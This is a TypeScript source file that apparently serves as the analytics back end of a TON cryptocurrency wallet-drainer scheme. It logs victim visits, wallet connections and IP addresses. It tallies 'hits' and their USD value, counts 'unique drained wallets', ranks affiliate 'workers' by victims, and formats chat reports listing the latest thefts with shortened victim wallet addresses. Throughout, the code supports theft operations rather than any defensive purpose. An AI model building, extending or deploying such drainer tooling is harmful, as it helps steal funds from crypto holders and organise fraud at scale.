import { PrismaClient } from '@prisma/client'
import { Ton } from '@api/tonapi'

const prisma = new PrismaClient()

export type EventKind = 'visit' | 'connect' | 'accept' | 'reject'

export interface EventInput {
	kind: EventKind
	wallet?: string
	workerId?: number
	item?: string
	amount?: number
	mode?: string
	tonValue?: number
	ip?: string
	reason?: string
}

/* TON price cache — one lookup per 10 min instead of one per event. */
let priceCache = { usd: 0, ts: 0 }
async function tonUsd(): Promise<number> {
	if (priceCache.usd > 0 && Date.now() - priceCache.ts < 600_000) return priceCache.usd
	const p = await Ton.getTonPrice()
	if (p > 0) priceCache = { usd: p, ts: Date.now() }
	return p || priceCache.usd
}

/** Fire-and-forget — a DB hiccup must never break the drain flow. */
export function record(e: EventInput): void {
	void (async () => {
		try {
			const tonValue = Number(e.tonValue) || 0
			const usdValue = tonValue > 0 ? (await tonUsd()) * tonValue : 0
			await prisma.event.create({ data: { ...e, tonValue, usdValue } })
		} catch (err: any) {
			console.error('[stats] record failed', err?.message ?? err)
		}
	})()
}

const HOUR = 3600_000
const short = (w?: string | null) =>
	w ? `${w.slice(0, 4)}…${w.slice(-4)}` : '—'
const ago = (d: Date) => {
	const s = Math.floor((Date.now() - d.getTime()) / 1000)
	if (s < 60) return `${s}s ago`
	if (s < 3600) return `${Math.floor(s / 60)}m ago`
	if (s < 86400) return `${Math.floor(s / 3600)}h ago`
	return `${Math.floor(s / 86400)}d ago`
}
const usd = (v: number) =>
	'$' + v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })

async function countAndSum(kind: EventKind, since?: Date) {
	const r = await prisma.event.aggregate({
		where: { kind, ...(since ? { createdAt: { gte: since } } : {}) },
		_count: { _all: true },
		_sum: { usdValue: true },
	})
	return { n: r._count._all, value: r._sum.usdValue ?? 0 }
}

export async function formatStats(): Promise<string> {
	const now = Date.now()
	const d12 = new Date(now - 12 * HOUR)
	const d24 = new Date(now - 24 * HOUR)
	const d7 = new Date(now - 7 * 24 * HOUR)

	const [
		hits, hits12, hits24, hits7,
		connects, conn12, conn24, conn7,
		visits, rejects,
	] = await Promise.all([
		countAndSum('accept'),
		countAndSum('accept', d12),
		countAndSum('accept', d24),
		countAndSum('accept', d7),
		countAndSum('connect'),
		countAndSum('connect', d12),
		countAndSum('connect', d24),
		countAndSum('connect', d7),
		countAndSum('visit'),
		countAndSum('reject'),
	])

	const [biggestEver, biggest24, lastHits, uniqueWallets, topWorker] = await Promise.all([
		prisma.event.findFirst({
			where: { kind: 'accept' },
			orderBy: { usdValue: 'desc' },
		}),
		prisma.event.findFirst({
			where: { kind: 'accept', createdAt: { gte: d24 } },
			orderBy: { usdValue: 'desc' },
		}),
		prisma.event.findMany({
			where: { kind: 'accept' },
			orderBy: { createdAt: 'desc' },
			take: 5,
		}),
		prisma.event
			.findMany({ where: { kind: 'accept' }, select: { wallet: true }, distinct: ['wallet'] })
			.then(r => r.length),
		prisma.event.groupBy({
			by: ['workerId'],
			where: { kind: 'accept' },
			_count: { _all: true },
			orderBy: { _count: { workerId: 'desc' } },
			take: 1,
		}),
	])

	const conv = connects.n > 0 ? ((hits.n / connects.n) * 100).toFixed(2) : '0.00'

	const line = (a: number, b: number, c: number) => `${a} · 24h ${b} · 7d ${c}`

	return [
		`🩸 <b>Hits number:</b> ${hits.n}`,
		`⏱️🩸 Last 12h: ${line(hits12.n, hits24.n, hits7.n)}`,
		``,
		`💸 <b>Total hits price:</b> ${usd(hits.value)}`,
		`⏱️💸 Last 12h: ${usd(hits12.value)} · 24h ${usd(hits24.value)} · 7d ${usd(hits7.value)}`,
		``,
		`📊 <b>Connects number:</b> ${connects.n}`,
		`⏱️📊 Last 12h: ${line(conn12.n, conn24.n, conn7.n)}`,
		``,
		`🚫 Rejects: ${rejects.n}`,
		`🌐 Visits: ${visits.n}`,
		`🎯 Conversion: <b>${conv}%</b> (${hits.n}/${connects.n})`,
		`👥 Unique drained wallets: ${uniqueWallets}`,
		``,
		`🏆 Biggest hit ever: ${biggestEver ? `${usd(biggestEver.usdValue)} — <code>${short(biggestEver.wallet)}</code> (${ago(biggestEver.createdAt)})` : '—'}`,
		`🔥 Biggest last 24h: ${biggest24 ? `${usd(biggest24.usdValue)} — <code>${short(biggest24.wallet)}</code>` : '—'}`,
		`👷 Top worker: ${topWorker[0]?.workerId ?? '—'} (${topWorker[0]?._count._all ?? 0} hits)`,
		``,
		`🕐 <b>Last 5 hits:</b>`,
		...(lastHits.length
			? lastHits.map(
					h =>
						`  • ${ago(h.createdAt)} · ${usd(h.usdValue)} · <code>${short(h.wallet)}</code> · ${h.item ?? ''}`
				)
			: ['  — none yet']),
		``,
		`<i>${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC</i>`,
	].join('\n')
}

export async function recentEvents(take = 10): Promise<string> {
	const rows = await prisma.event.findMany({ orderBy: { createdAt: 'desc' }, take })
	if (!rows.length) return 'no events yet'
	const icon: Record<string, string> = {
		accept: '✅', reject: '🚫', connect: '🔗', visit: '🌐',
	}
	return rows
		.map(
			r =>
				`${icon[r.kind] ?? '•'} ${ago(r.createdAt)} · ${r.kind}` +
				(r.wallet ? ` · <code>${short(r.wallet)}</code>` : '') +
				(r.usdValue ? ` · ${usd(r.usdValue)}` : '') +
				(r.item ? ` · ${r.item}` : '')
		)
		.join('\n')
}
